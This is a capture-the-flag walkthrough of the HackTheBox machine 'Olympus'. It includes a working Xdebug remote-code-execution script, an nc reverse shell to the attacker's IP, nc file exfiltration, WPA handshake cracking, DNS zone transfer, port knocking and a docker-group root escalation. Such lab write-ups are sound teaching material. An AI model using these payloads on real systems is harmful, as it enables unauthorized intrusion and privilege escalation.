---
title: HackTheBox - Olympus
date: 2023-04-18 11:00:00 +0800
categories: [HackTheBox, Medium]
tags: [dns-zone-transfer, port-knocking, docker, xdebug, hashcat, pcap]
media_subpath: /assets/img/machines/olympus/
---

![Olympus Machine Info](olympus-machine-card.png)

# Info

Olympus has been among the machines I've found most enjoyable, as it demands a diverse range of techniques. [OscarAkaElvis](https://twitter.com/OscarAkaElvis) crafted an engaging machine that features multiple phases, each providing a hint without directly disclosing the path to follow. This design ensures a rewarding and challenging experience throughout the process.

# Enumeration

## Port Scanning

> script scanning (`-sC`), version scanning (`-sV`), output all formats (`-oA`)
{: .prompt-info }

```bash
$ nmap -sC -sV -oA nmap/olympus 10.129.197.77
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 14:38 EDT
Nmap scan report for 10.129.197.77
Host is up (0.047s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
| dns-nsid: 
|_  bind.version: Bind
80/tcp   open     http    Apache httpd
|_http-title: Crete island - Olympus HTB
|_http-server-header: Apache
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
| ssh-hostkey: 
|   2048 f2badb069500ec0581b0936032fd9e00 (RSA)
|   256 7990c03d436c8d721960453cf89914bb (ECDSA)
|_  256 f85b2e32950312a33b40c51127ca7152 (ED25519)
```
{: .nolineno }

Nmap tells us that the machine has two `SSH` services, one on port `22` (filtered) and one on port `2222` (open), plus port `53` which is used for `DNS` and port `80` which is basically `Apache`.

## DNS (53)

The first thing that comes to mind when I see port 53 open is to try a DNS Zone Transfer.

> A DNS zone transfer is a mechanism used by secondary DNS servers to retrieve a complete copy of the DNS database (zone) from the primary DNS server. This helps keep the secondary servers in sync with the primary server and ensures high availability of DNS services. However, if the primary DNS server is misconfigured to allow zone transfers to unauthorized parties, attackers can use this to obtain valuable information about the target's network, such as a list of IP addresses, hostnames, and other network resources registered in the DNS zone. This information can be used to launch further attacks and gain a better understanding of the target's network topology.
{: .prompt-info }

To perform this attack, we need to know the domain of the machine, generally in HackTheBox the default domains of the machines are always in the format `machinename.htb`, in our case, `olympus.htb`. To do this we will have to run the following command: 

```bash
$ dig axfr @10.129.197.77 olympus.htb

; <<>> DiG 9.18.8-1-Debian <<>> axfr @10.129.197.77 olympus.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
{: .nolineno }

We can see that the zone transfer has failed, probably because it is configured correctly or because `olympus.htb` is not the correct domain, so for now let's jump to something else but keep this in mind.

## Apache (80)

When entering the web all we can see is a picture of Zeus as wallpaper and the name of the page which is Crete Island, between this and that the machine is called Olympus, we can imagine what the theme is about.

![Crete Island Web Page](crete-island.png)

It looks like a simple page without much content, but looking at the headers of the request, one in particular catches my attention as it is not very normal, I'm talking specifically about the header `Xdebug`.

> `Xdebug` is a PHP extension used for debugging and profiling PHP code during development.
{: .prompt-info }

The existence of the `Xdebug` header does not always indicate that this server is vulnerable to anything, it all depends on the configuration it has, but in the best case, we could have an injection of php code which could end up in a `Remote Command Execution`. The fastest way to reach our target is by using `XDEBUG_SESSION`.

> The `XDEBUG_SESSION` parameter is used to start an Xdebug debugging session for a specific request. When this parameter is present in a request, Xdebug will start a debugging session and intercept the request, allowing the attacker to execute arbitrary PHP code.
{: .prompt-info }

This basically means that if we send a request to the server with the header `XDEBUG_SESSION`, what it will do is to start a debug session that by default occurs on port `9000` in which we will be able to execute commands at will.

# Shell as www-data

To test if all this works, lets create a file called `exploit.py` and write the following content:

```python
#!/usr/bin/env python3

import socket
import base64

sk = socket.socket()
sk.bind(('0.0.0.0', 9000))
sk.listen(10)

conn, addr = sk.accept()

while True:
    cmd = 'system("{}")'.format(input('>> ')).encode('utf-8')
    conn.sendall(('eval -i 1 -- %s\x00' % base64.b64encode(cmd).decode('utf-8')).encode('utf-8'))
```

What this script does is to listen on port 9000 for a new connection, when it receives a connection it waits for the user input and creates a payload that it sends to execute the command in a shell.

You can find the original post in this [Link](https://github.com/nqxcode/xdebug-exploit/blob/master/exploit_shell.py), the version above is just a modification from python2 to python3.

Perfect, now in a terminal we execute the script with the command `python3 exploit.py` and in another terminal, we have to send a request to the web with the cookie of `XDEBUG_SESSION`.

```bash
$ python3 exploit.py
>> id
>> 
```
{: .nolineno }

```bash
$ curl http://10.129.197.77 -H "Cookie: XDEBUG_SESSION=v3herocks"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{: .nolineno }

As we can see, the command has been executed and we have the output in the other window, now that we know that we can execute commands, let's get a reverse shell, but first we have to open a `nc` waiting for connection, for this we open another terminal and write:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```
{: .nolineno }

As for the reverse shell payload you have a very good guide and examples in [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), we will try first with a simple one.

```bash
$ python3 exploit.py
>> id
>> nc -e /bin/sh 10.10.14.70 1337         
```
{: .nolineno }

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.197.77] 42482
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{: .nolineno }

# Pivot to Olympia

On a quick scan of the machine, from what we can see it appears to be a container as we have a `.dockerenv` and a rather unusual hostname.

It seems that there is a user named `zeus` and we can see his home folder, if we explore a little among his files, we see an interesting directory:

```bash
$ pwd
/home/zeus/airgeddon/captured

$ ls -la
total 304
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8  2018 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8  2018 papyrus.txt

$ cat papyrus.txt
Captured while flying. I'll banish him to Olympia - Zeus
```
{: .nolineno }

Next to what looks like a clue, we can see a file with extension `.cap` which is the packet capture of the network traffic.
Let's transfer the file to our local machine for further analysis.

```bash
$ nc -nlvp 8888 > captured.cap               
listening on [any] 8888 ...
```
{: .nolineno }

```bash
$ nc 10.10.14.70 8888 < captured.cap
```
{: .nolineno }

## Analyzing CAP File

To inspect the `CAP` file we will open it using `Wireshark`.

![CAP file on Wireshark](wireshark.png)

It seems to be the connection traffic against an SSID with the name `Too_cl0se_to_th3_Sun`, sounds suspicious doesn't it?

To crack the `CAP` file password there are several options, the fastest is to convert the `.cap` file to `.hc22000` so `hashcat` can recognize it and crack the password, the slowest version is using `aircrack`. As I said we will use the first one, so the first step is to convert the file using [cap2hashcat](https://hashcat.net/cap2hashcat/).

Once we have the file, we run hashcat on it:

```bash
$ hashcat -m 22000 hash.hc22000 -a 0 /usr/share/wordlists/rockyou.txt
[...]
ac1a7384fbbf759c86cf5b5af48a4c38:f4ec38aba8a9:c0eefbdffc2a:Too_cl0se_to_th3_Sun:flightoficarus
[...]
```
{: .nolineno }

`flightoficarus` is the key we were looking for.

This is the most imaginative part of the machine, because at first I thought we got the ssh credentials but no combination worked.
If we pay attention to what `Too_cl0se_to_th3_Sun:flightoficarus` means, you don't have to be a genius to detect that it refers to [Icarus](https://en.wikipedia.org/wiki/Icarus), maybe this is the username?

```bash
$ ssh icarus@10.129.197.77 -p 2222
icarus@620b296204a3:~$
```
{: .nolineno }

Bingo! indeed `icarus:Too_cl0se_to_th3_Sun` are the SSH credentials, remember that the only ssh we can connect to is the one on port `2222`, since the one running on port `22` is still filtered for the moment.

# Pivot to Rhodes

Once again it seems that we are in a container.

```bash
icarus@620b296204a3:~$ cat help_of_the_gods.txt 

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```
{: .nolineno }

Enumerating the machine we can see an interesting file called `help_of_the_gods.txt` in the icarus user's home. At the end of the hint, we can see a domain name that we had not seen so far `ctfolympus.htb`.


## DNS Zone Transfer

Remember that at the beginning we saw port `53` open and we performed a zone transfer on what we thought was the domain `olympus.htb`, let's try again with this one we just found.

```bash
$ dig axfr @10.129.197.77 ctfolympus.htb

; <<>> DiG 9.18.8-1-Debian <<>> axfr @10.129.197.77 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 47 msec
;; SERVER: 10.129.197.77#53(10.129.197.77) (TCP)
;; WHEN: Mon Apr 17 17:05:14 EDT 2023
;; XFR size: 15 records (messages 1, bytes 475)
```
{: .nolineno }

Perfect! now we get information and also with a very interesting and uncommon entry in the `TXT` record, `"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"`.

## Port Knocking

At first I had a hard time understanding the message as it was the first time I had encountered this technique called `Port Knocking`.

> Port knocking is a technique used to provide an additional layer of security for network services. The idea is to `knock` on a sequence of network ports in a specific order and timing to trigger the opening of a connection to a specific service or machine. In other words, port knocking involves attempting to connect to a series of closed ports in a predetermined order and with specific timing, to signal a daemon to open a specific port or allow access to a specific service.
{: .prompt-info }

The message contains everything we need! `(3456 8234 62431)` being these the ports to call in order, `prometheus` which seems to be the username and `St34l_th3_F1re!` which seems to be the password.

To perform the port knocking we are going to use `knock`, for this we specify the host and the ports in the order that it says in the message.

```bash
$ knock 10.129.197.77 3456 8234 62431                       
$ nmap -p22 10.129.197.77            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 17:18 EDT
Nmap scan report for 10.129.197.77
Host is up (0.045s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```
{: .nolineno }

As we can see if after doing the port knocking we launch an `nmap`, port `22 appears open`! Let's repeat it again but trying to connect via ssh with the `prometheus` user.

```bash
$ knock 10.129.197.77 3456 8234 62431 && ssh prometheus@10.129.197.77
prometheus@10.129.197.77's password: 

Welcome to
                            
    )         (             
 ( /(     )   )\ )   (      
 )\()) ( /(  (()/(  ))\ (   
((_)\  )(_))  ((_))/((_))\  
| |(_)((_)_   _| |(_)) ((_) 
| ' \ / _` |/ _` |/ -_)(_-< 
|_||_|\__,_|\__,_|\___|/__/ 
                           
prometheus@olympus:~$
```
{: .nolineno }

Finally, in the home we can find the first flag `user.txt`.

# Privilege Escalation

Along with the flag, we can see a file called `msg_of_gods.txt` with what appears to be the final clue, indicating that Olympus is the end of the road. 

```bash
prometheus@olympus:~$ cat msg_of_gods.txt 

Only if you serve well to the gods, you'll be able to enter into the

      _                           
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |<_-<
\___/|_|`_. ||_|_|_||  _/`___|/__/
        <___'       |_|           


```
{: .nolineno }

After a bit of enumeration I see something interesting, the current user is a member of the `docker` group, which means that we can create new containers at will.

```bash
prometheus@olympus:~$ id
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
prometheus@olympus:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
f00ba96171c5        crete               "docker-php-entrypoi…"   5 years ago         Up 27 hours         0.0.0.0:80->80/tcp                       crete
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   5 years ago         Up 27 hours         0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      5 years ago         Up 27 hours         0.0.0.0:2222->22/tcp                     olympia
```
{: .nolineno }

Abusing this capability, the plan of attack is to create a new docker using any of the available images and mount the `root (/)` volume in a folder inside the container, that will allow us to read the root directory and get the latest flag.

```bash
prometheus@olympus:~$ docker run -v /:/v3he -i -t olympia /bin/bash
```
{: .nolineno }

Let's break down the command that we just executed:

* `docker run` is a command used to start a new Docker container.
* `-v /:/v3he` is a flag that mounts the root directory of the host machine as a volume in the container. This is done using the format -v [host directory]:[container directory].
* `-i` is a flag that starts the container in interactive mode, allowing the user to interact with the container's shell.
* `-t` is a flag that allocates a terminal for the container.
* `olympia` is the name of the Docker image to be used to start the container.
* `/bin/bash` is the command to be run inside the container's shell.

Overall, this command is running a Docker container using the olympia image, mounting the host machine's root directory as a volume in the container, and starting a Bash shell inside the container for the user to interact with. The -i and -t flags ensure that the container is started in interactive mode with a terminal allocated to it.

In the bash that has appeared on the screen we can enter the folder in which we mounted the `root volume (/)` and see the root folder which contains the `root.txt` flag.

```bash
root@3f8ef4444d1b:/# cd v3he/root/
root@3f8ef4444d1b:/v3he/root# ls -la
total 28
drwx------  4 root root 4096 Apr 16 18:35 .
drwxr-xr-x 22 root root 4096 Aug 10  2022 ..
lrwxrwxrwx  1 root root    9 Aug 10  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Aug 10  2022 .cache
drwxr-xr-x  2 root root 4096 Aug 10  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Apr 16 18:35 root.txt
```
{: .nolineno }

# Final Thoughts

In general I loved this machine, it was a lot of fun, the only downside was that for the icarus user you had to have a bit of imagination (nothing you can't find in 15 minutes). Many thanks to [OscarAkaElvis](https://twitter.com/OscarAkaElvis) for creating such an interesting machine with which I had a great time at the time and now I bring you all to enjoy it after many years.